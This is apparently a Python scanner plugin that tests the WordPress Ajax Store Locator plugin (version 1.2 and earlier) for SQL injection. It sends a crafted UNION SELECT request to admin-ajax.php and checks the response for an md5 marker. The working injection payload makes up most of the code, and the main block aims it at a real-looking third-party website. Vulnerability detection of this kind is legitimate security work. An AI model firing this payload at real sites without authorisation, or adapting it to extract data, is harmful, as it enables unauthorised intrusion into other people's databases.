__author__ = 'tyq'
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#name:Wordpress Ajax Store Locator <= 1.2 SQL Injection Vulnerability
#refer https://www.bugscan.net/#!/x/21653


def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = 'wp-admin/admin-ajax.php?action=sl_dal_searchlocation&funMethod=SearchStore&Location=Social&StoreLocation=1~1+UNION+SELECT+1,2,3,4,md5(123123123),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--'
    url = arg + payload
    code,head, res,_, _  = curl.curl('%s' % url)
    if code==200 and "f5bb0c8de146c67b44babbf4e6584cc0" in res:

        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.moniandj.com/')[1])
